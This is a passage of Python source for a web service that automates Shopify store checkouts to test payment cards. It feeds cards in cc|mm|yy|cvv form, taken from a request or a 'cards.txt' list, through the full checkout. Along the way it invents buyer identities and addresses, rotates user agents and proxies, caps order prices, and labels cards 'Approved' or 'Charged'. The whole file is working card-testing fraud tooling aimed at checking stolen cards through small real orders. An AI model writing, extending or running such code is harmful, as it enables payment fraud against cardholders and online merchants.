        return best, candidates, None

    except (asyncio.TimeoutError, RequestsError):
        err = "Timeout"
        return None, [], err
    except Exception as ex:
        return None, [], str(ex)
    finally:
        if owned:
            res = session.close()
            if asyncio.iscoroutine(res):
                await res


# ---------------------------------------------------------------------------
# Core checkout validator
# ---------------------------------------------------------------------------
async def validate_card(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    site_url:   str,
    variant_id: Optional[str] = None,
    proxy_str:  Optional[str] = None,
    max_price:  Optional[float] = None,
) -> dict:
    """
    Full Shopify checkout flow:
      1. Add to cart
      2. Get checkout page  →  extract session token
      3. Shipping proposal  (GraphQL)
      4. Delivery proposal  (GraphQL)
      5. Tokenize card      (PCI vault)
      6. Submit mutation    (GraphQL)
      7. Poll receipt       (GraphQL, if needed)

    Returns a dict with Response, CC, Price, Gate, Site, Charged, Approved, Time.
    """
    t0       = time.time()
    gateway  = "UNKNOWN"
    price    = "0.00"
    currency = "USD"
    product_title = ""
    effective_max_price = max_price if max_price is not None else MAX_PRICE

    site_url = site_url.strip()
    ourl     = site_url if site_url.startswith("http") else f"https://{site_url}"
    hostname = urlparse(ourl).netloc
    proxy    = _parse_proxy(proxy_str)
    ua       = random.choice(USER_AGENTS)

    def _r(response: str, charged: str = "False", approved: str = "False") -> dict:
        return {
            "Response": response,
            "CC":       f"{cc}|{month}|{year}|{cvv}",
            "Product":  product_title,
            "Price":    price,
            "Gate":     gateway,
            "Site":     ourl,
            "Charged":  charged,
            "Approved": approved,
            "Time":     f"{round(time.time() - t0, 2)}s",
        }

    sem = _site_semaphores[hostname]
    session, owned = _make_session(proxy_str)

    async with sem:
        try:
            addr         = _pick_address(ourl)
            country_code = addr["countryCode"]
            first, last, email = _random_identity()
            phone  = addr["phone"]
            street = addr["address1"]
            city   = addr["city"]
            state  = addr["zoneCode"]
            s_zip  = addr["postalCode"]

            # ── 0. Fetch product if no variant supplied ──────────────────
            best, all_candidates, err = await _fetch_products(ourl, proxy_str)
            
            # Filter candidates under effective_max_price
            if all_candidates:
                candidates_under_max = [c for c in all_candidates if float(c.get("price", 999999)) <= effective_max_price]
            else:
                candidates_under_max = [best] if (best and float(best.get("price", 999999)) <= effective_max_price) else []

            if not variant_id:
                if not candidates_under_max:
                    return _r(f"NO_PRODUCT: {err or f'No products under ${effective_max_price:.2f}'}")
                chosen_prod   = random.choice(candidates_under_max)
                variant_id    = chosen_prod["variant_id"]
                price         = chosen_prod["price"]
                product_title = chosen_prod.get("title", "")
            else:
                matched = next(
                    (c for c in (all_candidates or []) if str(c.get("variant_id")) == str(variant_id)),
                    None,
                )
                if not matched:
                    return _r(f"PRICE_OVER_MAX: variant {variant_id} is not available")
                price         = matched["price"]
                product_title = matched.get("title", "")

            # Hard guard on the resolved base price.
            try:
                if float(price) > effective_max_price:
                    return _r(f"PRICE_OVER_MAX: base price ${price} > ${effective_max_price:.2f}")
            except (ValueError, TypeError):
                pass

            base_headers = {
                "User-Agent":         ua,
                "Accept":             "application/json, text/plain, */*",
                "Accept-Language":    "en-US,en;q=0.9",
                "Content-Type":       "application/json",
                "Origin":             ourl,
                "Referer":            f"{ourl}/",
                "sec-ch-ua":          '"Chromium";v="136", "Not-A.Brand";v="24"',
                "sec-ch-ua-mobile":   "?0",
                "sec-ch-ua-platform": '"Windows"',
            }

            # ── 1. Add to cart ──────────────────────────────────────────
            cart_added = False
            for payload, ct in [
                (f"id={variant_id}&quantity=1",
                 "application/x-www-form-urlencoded"),
                (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
                 "application/json"),
            ]:
                try:
                    r = await session.post(
                        f"{ourl}/cart/add.js",
                        data=payload,
                        headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},

                    )
                    if r.status_code == 200:
                        cart_added = True
                        break
                    # read body so connection returns to pool
                    pass
                except Exception:
                    continue

            if not cart_added:
                return _r("CART_FAILED")

            # ── 2. Get checkout page ────────────────────────────────────
            try:
                cr = await session.post(
                    f"{ourl}/checkout/",
                    allow_redirects=True,
                    headers={**base_headers,
                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},

                )
                checkout_url = str(cr.url)
                page_text    = cr.text
            except (asyncio.TimeoutError, RequestsError):
                return _r("TIMEOUT")
            except Exception as ex:
                return _r(f"CHECKOUT_FAILED: {type(ex).__name__}")

            lower_url = checkout_url.lower()
            if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
                return _r("SITE_REQUIRES_LOGIN")

            # Extract attempt token from URL
            m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
            if m:
                attempt_token = m.group(1)
            else:
                attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]

            if not attempt_token or len(attempt_token) < 4:
                return _r("NO_ATTEMPT_TOKEN")

            # Extract session token
            sst = _extract_sst(page_text, dict(cr.headers))
            if not sst:
                return _r("NO_SESSION_TOKEN")

            # Extract misc tokens
            queue_token = (
                _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                _extract(page_text, '"queueToken":"', '"')
            )
            stable_id = (
                _extract(page_text, 'stableId&quot;:&quot;', "&quot;") or
                _extract(page_text, '"stableId":"', '"') or
                "1"
            )

            # Merchandise GID
            merch_gid = (
                _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                _extract(page_text, "ProductVariantMerchandise/", '&q') or
                _extract(page_text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                str(variant_id)
            )

            # Currency
            for s, e in [
                ('currencyCode&quot;:&quot;', "&quot;"),
                ('"currencyCode":"', '"'),
            ]:
                val = _extract(page_text, s, e)
                if val and len(val) == 3 and val.isalpha():
                    currency = val.upper()
                    break

            # Re-select address based on detected currency (initial pick used URL only)
            addr         = _pick_address(ourl, currency)
            country_code = addr["countryCode"]
            phone        = addr["phone"]
            street       = addr["address1"]
            city         = addr["city"]
            state        = addr["zoneCode"]
            s_zip        = addr["postalCode"]

            # Subtotal
            subtotal = (
                _extract(page_text,
                         'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                         "&quot;") or
                _extract(page_text,
                         '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                subtotal = m2.group(1) if m2 else "0.01"

            # Build ID & source token
            unescaped  = page_text.replace("&quot;", '"').replace("&amp;", "&")
            build_id   = None
            m3         = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m3:
                build_id = m3.group(1)

            source_token = _extract(page_text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            m4 = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if m4:
                ident_sig = m4.group(1)

            graphql_url = f"https://{hostname}/checkouts/unstable/graphql"

            gql_headers = {
                **base_headers,
                "shopify-checkout-client":  "checkout-web/1.0",
                "shopify-checkout-source":  f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if build_id:
                gql_headers["x-checkout-web-build-id"]     = build_id
                gql_headers["x-checkout-web-deploy-stage"] = "production"
            if source_token:
                gql_headers["x-checkout-web-source-id"] = source_token

            merch_id_full   = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
            variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

            # ── Build base shipping variables (deep-copyable template) ──
            def _base_vars() -> dict:
                return {
                    "sessionInput":  {"sessionToken": sst},
                    "queueToken":    queue_token or "",
                    "discounts":     {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": "", "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": first, "lastName": last,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments":              {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes":    ["SHIPPING"],
                            "expectedTotalPrice":     {"any": True},
                            "destinationChanged":     True,
                        }],
                        "noDeliveryRequired":          [],
                        "useProgressiveRates":         False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping":       True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id":               merch_id_full,
                                    "variantId":        variant_id_full,
                                    "properties":       [],
                                    "sellingPlanId":    None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity":             {"items": {"value": 1}},
                            "expectedTotalPrice":   {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents":       [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "", "city": "", "countryCode": country_code,
                                "lastName": "", "zoneCode": state, "phone": "",
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer":          {"presentmentCurrency": currency, "countryCode": country_code},
                        "email":             email,
                        "emailChanged":      False,
                        "phoneCountryCode":  country_code,
                        "marketingConsent":  [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe":        False,
                    },
                    "tip":   {"tipLines": []},
                    "taxes": {
                        "proposedAllocations":         None,
                        "proposedTotalAmount":         {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions":          [],
                    },
                    "note":               {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint":  {
                        "signature":             None, "signatureUuid":         None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "memberships": {"memberships": []},
                    "cartMetafields": [],
                }

            # ── 3. Shipping proposal ─────────────────────────────────────
            ship_vars      = _base_vars()
            resp_json: Any = None

            for attempt in range(3):
                try:
                    r = await session.post(
                        graphql_url,
                        params={"operationName": "Proposal"},
                        headers=gql_headers,
                        json={"query": QUERY_PROPOSAL_SHIPPING, "variables": ship_vars,
                              "operationName": "Proposal"},

                    )
                    resp_json = orjson.loads(r.content)
                except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError):
                    if attempt < 2:
                        await asyncio.sleep(1)
                    continue

                data = resp_json.get("data", {}) or {}
                if data.get("session"):
                    break

                gql_errs = resp_json.get("errors", []) or []
                if gql_errs:
                    log.debug("shipping proposal GQL errors: %s", gql_errs)
                    interpreted = _parse_gql_errors(gql_errs)
                    # For checkout-level errors (not card step), only bail
                    # immediately on non-retryable state errors
                    if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
                                       "THROTTLED", "NO_PRODUCT"):
                        return _r(interpreted)
                    if attempt < 2:
                        await asyncio.sleep(1.5)
                        continue
                    return _r(interpreted if interpreted != "GRAPHQL_ERROR"
                              else "GRAPHQL_ERROR")

            if not resp_json or not (resp_json.get("data") or {}).get("session"):
                return _r("GRAPHQL_ERROR")

            # Refresh session token from shipping proposal response
            try:
                _ship_sst = r.headers.get("x-checkout-one-session-token")
                if _ship_sst:
                    sst = _ship_sst
                    gql_headers["x-checkout-one-session-token"] = sst
            except Exception:
                pass

            session_data = resp_json["data"]["session"]
            negotiate    = session_data.get("negotiate") or {}

            # Check negotiate-level errors first
            neg_errors = negotiate.get("errors") or []
            if neg_errors:
                code = _parse_gql_errors(neg_errors)
                if code != "GRAPHQL_ERROR":
                    return _r(code)

            result_obj  = negotiate.get("result") or {}
            result_type = result_obj.get("__typename", "")

            if result_type == "CheckpointDenied":
                return _r("CHECKPOINTDENIED")
            if result_type in ("Throttled", "TooManyRequests"):
                return _r("THROTTLED")
            if result_type == "NegotiationResultFailed":
                return _r("NEGOTIATE_FAILED")

            checkpoint_data = result_obj.get("checkpointData")
            seller          = result_obj.get("sellerProposal") or {}

            if not seller:
                return _r("NO_SELLER_PROPOSAL")


            running_total_data = seller.get("runningTotal") or {}
            running_total      = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")

            # Delivery info
            delivery_data     = seller.get("delivery") or {}
            delivery_strategy = ""
            shipping_amount   = 0.0
            if delivery_data.get("__typename") == "FilledDeliveryTerms":
                d_lines = delivery_data.get("deliveryLines") or []
                if d_lines:
                    strategies = d_lines[0].get("availableDeliveryStrategies") or []
                    if strategies:
                        delivery_strategy = strategies[0].get("handle", "")
                        try:
                            amt_data = strategies[0].get("amount") or {}
                            shipping_amount = float(
                                amt_data.get("value", {}).get("amount") or amt_data.get("amount") or "0"
                            )
                        except (ValueError, TypeError):
                            shipping_amount = 0.0

            # Tax
            tax_data   = seller.get("tax") or {}
            tax_amount = 0.0
            if tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    tax_amt_data = tax_data.get("totalTaxAmount") or {}
                    tax_amount = float(
                        tax_amt_data.get("value", {}).get("amount") or tax_amt_data.get("amount") or "0"
                    )
                except (ValueError, TypeError):
                    pass

            # Payment method
            payment_data       = seller.get("payment") or {}
            payment_identifier = None
            if payment_data.get("__typename") == "FilledPaymentTerms":
                avail_lines = payment_data.get("availablePaymentLines") or []
                for line in avail_lines:
                    pm = line.get("paymentMethod") or {}
                    pm_type = pm.get("__typename", "")
                    pid = pm.get("paymentMethodIdentifier")
                    if pid:
                        detected_gateway = (pm.get("extensibilityDisplayName") or
                                            pm.get("name") or pm.get("brand") or
                                            pm.get("displayName") or "Shopify Payments")
                        # Only proceed if the gateway is explicitly Shopify Payments
                        if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
                            payment_identifier = pid
                            gateway = detected_gateway
                            price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                            # Hard guard: never submit a checkout whose total
                            # (product + shipping + tax) exceeds MAX_PRICE.
                            try:
                                if float(price) > MAX_PRICE:
                                    return _r(
                                        f"PRICE_OVER_MAX: total ${price} > ${MAX_PRICE:.2f}"
                                    )
                            except (ValueError, TypeError):
                                pass
                            break

            if not payment_identifier:
                return _r("NO_SHOPIFY_PAYMENTS_GATEWAY")

            # ── 4. Delivery proposal ─────────────────────────────────────
            # IMPORTANT: deep-copy the base vars so we don't share mutable state
            deliv_vars = copy.deepcopy(ship_vars)
            deliv_vars["sessionInput"]["sessionToken"] = sst

            deliv_vars["delivery"]["deliveryLines"][0].update({
                "destination": {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                },
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_strategy, "customDeliveryRate": False
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "expectedTotalPrice": {
                    "value": {"amount": str(shipping_amount), "currencyCode": currency}
                },
                "destinationChanged": False,
            })
            deliv_vars["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }
            deliv_vars["taxes"]["proposedTotalAmount"] = {
                "value": {"amount": str(tax_amount), "currencyCode": currency}
            }
            deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {
                "number": phone, "countryCode": country_code
            }
            if checkpoint_data:
                deliv_vars["checkpointData"] = checkpoint_data

            try:
                dr = await session.post(
                    graphql_url,
                    params={"operationName": "Proposal"},
                    headers=gql_headers,
                    json={"query": QUERY_PROPOSAL_DELIVERY, "variables": deliv_vars,
                          "operationName": "Proposal"},

                )
                d_resp = orjson.loads(dr.content)
                log.debug("delivery proposal response keys: %s",
                          list(d_resp.keys()) if isinstance(d_resp, dict) else type(d_resp))
                if "errors" in d_resp and "data" not in d_resp:
                    log.debug("delivery proposal schema errors: %s",
                              [e.get("message") for e in d_resp.get("errors", [])][:3])
                # Refresh session token from delivery response
                _del_sst = dr.headers.get("x-checkout-one-session-token")
                if _del_sst:
                    sst = _del_sst
                    gql_headers["x-checkout-one-session-token"] = sst
                # Handle SubmittedForCompletion from delivery step (digital goods / auto-submit)
                d_result = (
                    d_resp.get("data", {}).get("session", {})
                    .get("negotiate", {}).get("result", {})
                )
                if d_result:
                    d_typename = d_result.get("__typename", "")
                    if d_typename == "SubmittedForCompletion":
                        # If payment was submitted/skipped before we even added our card, we can't test this product.
                        return _r("NO_PAYMENT_REQUIRED", charged="False", approved="False")
                    # Update running_total from delivery seller proposal
                    d_seller = d_result.get("sellerProposal") or {}
                    d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
                    d_amt    = d_total.get("value", {}).get("amount") or d_total.get("amount")
                    if d_amt:
                        running_total = d_amt
                        try:
                            price = f"{float(running_total):.2f}"
                        except (ValueError, TypeError):
                            pass
                        # Hard guard: never submit a checkout whose total
                        # exceeds MAX_PRICE (delivery step).
                        try:
                            if float(price) > MAX_PRICE:
                                return _r(
                                    f"PRICE_OVER_MAX: total ${price} > ${MAX_PRICE:.2f}"
                                )
                        except (ValueError, TypeError):
                            pass
                    # Extract delivery strategy from delivery response
                    d_delivery = d_seller.get("delivery") or {}
                    if d_delivery.get("__typename") == "FilledDeliveryTerms":
                        d_d_lines = d_delivery.get("deliveryLines") or []
                        if d_d_lines:
                            d_strategies = d_d_lines[0].get("availableDeliveryStrategies") or []
                            d_selected = d_d_lines[0].get("selectedDeliveryStrategy") or {}
                            if d_selected.get("handle"):
                                delivery_strategy = d_selected["handle"]
                            elif d_strategies:
                                delivery_strategy = d_strategies[0].get("handle", delivery_strategy)
                            # Update shipping amount from delivery response
                            if d_strategies:
                                d_ship_amt = d_strategies[0].get("amount") or {}
                                try:
                                    shipping_amount = float(
                                        d_ship_amt.get("value", {}).get("amount") or
                                        d_ship_amt.get("amount") or "0"
                                    )
                                except (ValueError, TypeError):
                                    pass
                    # Update tax from delivery response
                    d_tax = d_seller.get("tax") or {}
                    if d_tax.get("__typename") == "FilledTaxTerms":
                        d_tax_amt = d_tax.get("totalTaxAmount") or {}
                        try:
                            tax_amount = float(
                                d_tax_amt.get("value", {}).get("amount") or
                                d_tax_amt.get("amount") or "0"
                            )
                        except (ValueError, TypeError):
                            pass
            except Exception as ex:
                log.debug("delivery proposal error: %s", ex)

            # ── 5. Tokenize card ─────────────────────────────────────────
            vault_payload = {
                "credit_card": {
                    "number":             cc,
                    "month":              int(month),
                    "year":               int(f"20{year}"),
                    "verification_value": cvv,
                    "name":               f"{first} {last}",
                    "start_month":        None,
                    "start_year":         None,
                    "issue_number":       "",
                },
                "payment_session_scope": hostname,
            }
            vault_headers = {
                "Content-Type":       "application/json",
                "Accept":             "application/json",
                "Accept-Language":    "en-US,en;q=0.9",
                "Origin":             "https://checkout.pci.shopifyinc.com",
                "User-Agent":         ua,
                "sec-ch-ua-mobile":   "?0",
                "sec-ch-ua-platform": '"Windows"',
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            vault_endpoints = [
                "https://checkout.pci.shopifyinc.com/sessions",
                "https://deposit.shopifyinc.com/sessions",
            ]
            token = None
            for vault_url in vault_endpoints:
                try:
                    vr = await session.post(
                        vault_url, json=vault_payload,
                        headers=vault_headers,
                    )
                    vd = orjson.loads(vr.content)
                    token = vd.get("id")
                    if token:
                        break
                except Exception:
                    continue

            if not token:
                return _r("TOKENIZATION_FAILED")

            # ── 6. Submit for completion ──────────────────────────────────
            billing_addr = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }

            def _build_submit_body() -> dict:
                submit_deliv_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
                submit_deliv_line["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_strategy, "customDeliveryRate": False
                    },
                    "options": {"phone": phone},
                }
                submit_deliv_line["expectedTotalPrice"] = {"any": True}

                submit_merch = copy.deepcopy(deliv_vars["merchandise"])
                for ml in submit_merch.get("merchandiseLines", []):
                    ml["expectedTotalPrice"] = {"any": True}

                return {
                    "query": MUTATION_SUBMIT,
                    "variables": {
                        "input": {
                            "sessionInput":       {"sessionToken": sst},
                            "queueToken":         queue_token or "",
                            "discounts":          {"lines": [], "acceptUnexpectedDiscounts": True},
                            "delivery": {
                                "deliveryLines":              [submit_deliv_line],
                                "noDeliveryRequired":         [],
                                "useProgressiveRates":        True,
                                "prefetchShippingRatesStrategy": None,
                                "supportsSplitShipping":      True,
                            },
                            "merchandise":  submit_merch,
                            "payment": {
                                "totalAmount": {"any": True},
                                "paymentLines": [{
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": payment_identifier,
                                            "sessionId":               token,
                                            "billingAddress":          billing_addr,
                                            "cardSource":              None,
                                        }
                                    },
                                    "amount": {"any": True},
                                    "dueAt": None,
                                }],
                                "billingAddress": billing_addr,
                            },
                            "buyerIdentity":      copy.deepcopy(deliv_vars["buyerIdentity"]),
                            "taxes": {
                                "proposedAllocations":         None,
                                "proposedTotalAmount":         {"any": True},
                                "proposedTotalIncludedAmount": None,
                                "proposedMixedStateTotalAmount": None,
                                "proposedExemptions":          [],
                            },
                            "tip":                {"tipLines": []},
                            "note":               {"message": None, "customAttributes": []},
                            "localizationExtension": {"fields": []},
                            "nonNegotiableTerms": None,
                            "optionalDuties":     {"buyerRefusesDuties": False},
                            **({"checkpointData": checkpoint_data} if checkpoint_data else {}),
                        },
                        "attemptToken": attempt_token,
                        "metafields": [],
                        "analytics": {"requestUrl": checkout_url},
                    },
                    "operationName": "SubmitForCompletion",
                }

            s_resp: dict = {}
            for submit_attempt in range(3):
                try:
                    sr = await session.post(
                        graphql_url,
                        params={"operationName": "SubmitForCompletion"},
                        headers=gql_headers,
                        json=_build_submit_body(),
                    )
                    s_resp = orjson.loads(sr.content)
                    # Refresh SST from submit response
                    _sub_sst = sr.headers.get("x-checkout-one-session-token")
                    if _sub_sst:
                        sst = _sub_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                except (asyncio.TimeoutError, RequestsError):
                    return _r("TIMEOUT")
                except Exception as ex:
                    log.debug("submit exception: %s", ex)
                    return _r("SUBMIT_FAILED")

                log.debug("submit[%d] response typename: %s", submit_attempt,
                          (s_resp.get("data") or {}).get("submitForCompletion", {}).get("__typename"))

                s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                if not s_data:
                    errs = s_resp.get("errors") or []
                    log.debug("submit no data, top-level errors: %s", errs)
                    if errs:
                        for err_item in errs:
                            for fld in ("code", "message"):
                                val = str(err_item.get(fld) or "").upper()
                                if val:
                                    norm = _normalize_response(val)
                                    if norm != "CARD_DECLINED":
                                        approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                                        return _r(norm, approved=approved)
                    return _r("GRAPHQL_ERROR")

                stype = s_data.get("__typename", "")

                # ConfirmChangeViolation → retry to accept changes
                if stype == "SubmitRejected":
                    sub_errs = s_data.get("errors") or []
                    all_confirmable = all(
                        e.get("__typename") == "ConfirmChangeViolation" for e in sub_errs
                    ) if sub_errs else False
                    if all_confirmable and submit_attempt < 2:
                        log.debug("submit[%d] ConfirmChangeViolation, retrying", submit_attempt)
                        await asyncio.sleep(0.5)
                        continue
                break

            stype = s_data.get("__typename", "")

            # ── Handle submit result types ────────────────────────────────
            if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = s_data.get("receipt") or {}
                rtype   = receipt.get("__typename", "")

                if rtype == "ProcessedReceipt":
                    return _r("ORDER_PLACED", charged="True", approved="True")
                if rtype == "ActionRequiredReceipt":
                    return _r("3DS_REQUIRED", approved="True")
                if rtype == "FailedReceipt":
                    pe      = receipt.get("processingError") or {}
                    pe_type = pe.get("__typename", "")
                    log.debug("FailedReceipt processingError: %s", pe)
                    if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                        return _r("NO_PRODUCT")
                    if pe_type == "OrderCreationFailure":
                        return _r("ORDER_CREATION_FAILED")
                    # PaymentFailed: check both code and messageUntranslated
                    code = str(pe.get("code") or "").upper()
                    msg  = str(pe.get("messageUntranslated") or "").upper()
                    raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                    norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                    approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                    return _r(norm, approved=approved)

                # ProcessingReceipt / WaitingReceipt → poll
                rid = receipt.get("id")
                if rid:
                    poll_body = {
                        "query":         QUERY_POLL,
                        "variables":     {"receiptId": rid, "sessionToken": sst},
                        "operationName": "PollForReceipt",
                    }
                    await asyncio.sleep(2)
                    for _ in range(6):
                        try:
                            pr = await session.post(
                                graphql_url,
                                params={"operationName": "PollForReceipt"},
                                headers=gql_headers,
                                json=poll_body,

                            )
                            pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
                            pt = pd.get("__typename", "")
                            if pt == "ProcessedReceipt":
                                return _r("ORDER_PLACED", charged="True", approved="True")
                            if pt == "ActionRequiredReceipt":
                                return _r("3DS_REQUIRED", approved="True")
                            if pt == "FailedReceipt":
                                pe      = pd.get("processingError") or {}
                                pe_type = pe.get("__typename", "")
                                if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                                    return _r("NO_PRODUCT")
                                code = str(pe.get("code") or "").upper()
                                msg  = str(pe.get("messageUntranslated") or "").upper()
                                # Detect captcha requirement and return a specific response
                                if code == "CAPTCHA_REQUIRED":
                                    return _r("CAPTCHA_REQUIRED", approved="False")
                                raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                                norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                                approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                                return _r(norm, approved=approved)
                            if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                delay = pd.get("pollDelay", 3000) / 1000
                                await asyncio.sleep(min(delay, 4))
                                continue
                        except Exception:
                            pass
                        break

                return _r("CARD_DECLINED")

            if stype == "SubmitFailed":
                return _r(_normalize_response(str(s_data.get("reason") or "")))

            if stype == "SubmitRejected":
                errs = s_data.get("errors") or []
                log.debug("SubmitRejected errors: %s", errs)
                if errs:
                    # Check ALL errors and ALL fields for the most specific code
                    best_code = "CARD_DECLINED"
                    for err_item in errs:
                        # Prefer nonLocalizedMessage (more specific) over localizedMessage
                        for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                                    "localizedMessageHtml"):
                            val = str(err_item.get(fld) or "").upper()
                            if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED",
                                                  "PAYMENT ERROR"):
                                continue
                            norm = _normalize_response(val)
                            if norm != "CARD_DECLINED":
                                best_code = norm
                                break
                        if best_code != "CARD_DECLINED":
                            break
                    approved = "True" if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                       "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                    return _r(best_code, approved=approved)
                return _r("CARD_DECLINED")

            if stype == "Throttled":
                return _r("THROTTLED")
            if stype == "CheckpointDenied":
                return _r("CHECKPOINTDENIED")

            return _r("CARD_DECLINED")

        except (asyncio.TimeoutError, RequestsError):
            return _r("TIMEOUT")
        except Exception as ex:
            log.debug("validate_card exception: %s", ex, exc_info=True)
            return {
                "Response": "ERROR",
                "CC":       f"{cc}|{month}|{year}|{cvv}",
                "Price":    price,
                "Gate":     gateway,
                "Site":     ourl,
                "Charged":  "False",
                "Approved": "False",
                "Time":     f"{round(time.time() - t0, 2)}s",
                "Detail":   f"{type(ex).__name__}: {str(ex)[:100]}",
            }
        finally:
            if owned:
                res = session.close()
                if asyncio.iscoroutine(res):
                    await res


# ---------------------------------------------------------------------------
# Valid gateway response codes (site is live)
# ---------------------------------------------------------------------------
LIVE_RESPONSES = frozenset({
    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
    "INVALID_CARD", "THROTTLED",
})


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.get("/shopify")
async def shopify_route(
    site:      str           = Query(..., description="Shopify store URL"),
    cc:        Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy:     Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    max_price: Optional[float] = Query(None, description="Max product price override"),
):
    """Validate a card against a Shopify store checkout."""
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)

    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400,
            )
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse(
                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
                status_code=400,
            )
        card = random.choice(cards)

    result = await validate_card(
        card["cc"], card["month"], card["year"], card["cvv"],
        site, proxy_str=proxy, max_price=max_price,
    )
